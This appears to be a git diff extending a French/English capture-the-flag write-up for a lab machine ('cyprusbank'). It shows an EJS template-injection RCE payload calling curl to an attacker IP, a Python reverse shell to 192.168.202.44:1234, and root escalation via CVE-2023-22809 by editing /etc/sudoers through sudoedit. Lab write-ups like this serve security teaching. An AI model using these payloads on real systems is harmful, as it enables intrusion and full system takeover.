@@ -89,3 +89,57 @@ L'erreur nous permet de savoir le templates utilisé par EJS (Embedded JavaScrip
 
 <img width="531" height="90" alt="image" src="https://github.com/user-attachments/assets/325a006a-abb1-4804-a828-b8b84af44acb" />
 
+La payload suivante me permet de m'assurer que la SSTI fonctionne et que l'on peut effectuer une exécution de code à distance (RCE) :
+name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl 192.168.202.44:8000');s
+<img width="1244" height="644" alt="image" src="https://github.com/user-attachments/assets/033eddbe-4e57-45e2-8ffb-b14d3382cd15" />
+
+Ca fonctionne !
+<img width="531" height="115" alt="image" src="https://github.com/user-attachments/assets/50af5687-c714-4ecb-973d-f3b73c27adeb" />
+
+Maintenant, nous pouvons l'utiliser pour obtenir un shell, d'abord en utilisant notre serveur web pour servir une charge utile de shell inversé.
+
+On créer un fichier 'payload.py', et y mets la charge utile :
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.202.44",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+<img width="618" height="380" alt="image" src="https://github.com/user-attachments/assets/72ea4b3d-4283-4718-97b2-9e9b80fcabbb" />
+<img width="606" height="90" alt="image" src="https://github.com/user-attachments/assets/9a31ed45-006d-4180-af08-688cc6c392ad" />
+<img width="522" height="92" alt="image" src="https://github.com/user-attachments/assets/e862b1c2-9371-43c6-8add-33cc70ba0e8d" />
+
+On effectue une shell stabilization :
+<img width="544" height="251" alt="image" src="https://github.com/user-attachments/assets/ef5be721-2c95-4cc9-89c3-b5b04de621e9" />
+
+On trouve le flag user.txt dans le home de l'utilisateur web.
+<img width="424" height="231" alt="image" src="https://github.com/user-attachments/assets/7fe17284-4f45-4755-9b8a-1ba85dd74e56" />
+
+Liste ce que l’utilisateur web peut exécuter avec sudo. On apprend que l’utilisateur web peut modifier un fichier de configuration Nginx en tant que root, sans mot de passe.
+<img width="668" height="164" alt="image" src="https://github.com/user-attachments/assets/549edde0-3acd-4571-ae35-6f200a31c15f" />
+
+En vérifiant la version de sudo, nous voyons qu'il s'agit de la version 1.9.12p1.
+<img width="316" height="96" alt="image" src="https://github.com/user-attachments/assets/a6e74132-eecb-4d01-bf05-bfaadc59fb39" />
+
+En recherchant les vulnérabilités dans la version 1.9.12p1 de sudoedit, nous avons trouvé la vulnérabilité CVE-2023-22809. Vous trouverez des informations détaillées à ce sujet dans cet avis de sécurité publié par Synacktiv (https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).
+
+Essentiellement, sudoedit permet aux utilisateurs de choisir leur éditeur à l'aide de variables d'environnement telles que SUDO_EDITOR, VISUAL ou EDITOR. Étant donné que les valeurs de ces variables peuvent être non seulement l'éditeur lui-même, mais aussi les arguments à passer à l'éditeur choisi, sudo utilise -- lors de leur analyse pour séparer l'éditeur et ses arguments des fichiers à ouvrir pour modification.
+
+Cela signifie qu'en utilisant l'argument -- dans les variables d'environnement de l'éditeur, nous pouvons le forcer à ouvrir d'autres fichiers que ceux autorisés dans la commande sudoedit que nous pouvons exécuter. Par conséquent, comme nous pouvons exécuter sudoedit en tant que root avec sudo, nous pouvons modifier n'importe quel fichier que nous voulons en tant que root.
+
+Pour utiliser cette vulnérabilité à des fins d'élévation de privilèges, nous pouvons écrire dans de nombreux fichiers. Dans ce cas, nous pouvons simplement choisir d'écrire dans le fichier /etc/sudoers pour nous accorder tous les privilèges sudo.
+
+Nous pouvons exploiter la vulnérabilité comme suit :
+web@cyprusbank:~/app$ export EDITOR="nano -- /etc/sudoers"
+web@cyprusbank:~/app$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+
+As we can see, we were able to open the /etc/sudoers file with nano.
+<img width="656" height="399" alt="image" src="https://github.com/user-attachments/assets/019cf8b5-1406-42cc-bffe-7f7f56a074a0" />
+
+Now, by making the addition of web ALL=(ALL) NOPASSWD: ALL to the file, we can grant our current user full sudo privileges.
+<img width="652" height="395" alt="image" src="https://github.com/user-attachments/assets/36834f4c-cb6c-482a-ab68-5c0862ba3af7" />
+
+After saving the file and closing both files, we can see the changes made to our sudo privileges.
+<img width="674" height="186" alt="image" src="https://github.com/user-attachments/assets/866d94a7-3c15-449f-97c3-66dbcbd26b2a" />
+
+Finally, by simply running sudo su -, we can get a shell as the root user and read the root flag at /root/root.txt.
+<img width="267" height="98" alt="image" src="https://github.com/user-attachments/assets/0eee1307-7369-41f4-a04f-4c64d06162a4" />
+
+
+
+
